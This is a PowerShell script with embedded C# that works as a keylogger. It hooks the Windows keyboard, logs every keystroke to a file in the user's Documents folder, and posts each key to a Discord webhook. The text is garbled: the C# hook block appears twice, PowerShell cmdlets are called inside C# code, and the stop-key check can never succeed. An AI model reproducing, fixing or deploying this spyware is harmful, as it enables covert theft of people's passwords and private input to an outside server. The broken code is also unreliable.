# Define the log file path
$logFilePath = "$env:USERPROFILE\Documents\keylog.txt"

# Initialize the last keystroke time
$lastKeystrokeTime = [System.DateTime]::Now

# Function to upload data to Discord
function Upload-Discord {
    param (
        [string]$text
    )

    $hookurl = "$dc"
    $Body = @{
        'keylog' = $text
    }

    if (-not [string]::IsNullOrEmpty($text)) {
        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
    }
}

# Check if the log file exists, and if not, create it
if (-not (Test-Path -Path $logFilePath)) {
    try {
        $null | Out-File -FilePath $logFilePath
    } catch {
        Write-Host "Error creating log file: $_"
    }
}

# Initialize the keylogger
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class InterceptKeys {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    public static void Main() {
        _hookID = SetHook(_proc);
        Application.Run();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;
            string key = keyChar.ToString();
            Add-Content -Path "$logFilePath" -Value $key;  # Log the key to the file
            Upload-Discord -text $key;  # Upload the key to Discord
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

# Start the keylogger
[InterceptKeys]::Main()

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;
            string key = keyChar.ToString();
            AddContent("$logFilePath", key);  // Log the key to the file defined earlier
            Upload-Discord -text $key;  // Upload the key to Discord
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@

# Initialize the key logger
[InterceptKeys]::Main()

# Start the script and wait for Ctrl+Alt+0 to stop
Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."

while ($true) {
    $key = [Console]::ReadKey()
    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "D0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "D0")) {
        # Stop the script and unregister events
        $timer.Stop()
        break
    }
}
